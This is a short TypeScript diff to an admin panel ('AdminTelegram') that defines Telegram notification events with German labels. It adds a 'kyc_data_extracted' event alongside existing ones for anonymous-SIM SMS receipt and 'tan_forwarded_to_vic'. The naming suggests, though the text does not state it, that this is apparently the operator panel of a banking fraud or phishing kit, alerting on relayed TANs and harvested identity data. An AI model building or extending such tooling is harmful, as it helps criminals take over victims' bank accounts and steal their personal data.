@@ -47,6 +47,7 @@ const EVENTS: { key: TelegramDbEvent; label: string }[] = [
   { key: "anosim_sms_received", label: "SMS eingegangen" },
   { key: "user_account_created", label: "Nutzerkonto erstellt" },
   { key: "tan_forwarded_to_vic", label: "TAN weitergeleitet" },
+  { key: "kyc_data_extracted", label: "KYC-Daten verfügbar" },
 ];
 
 export default function AdminTelegram() {
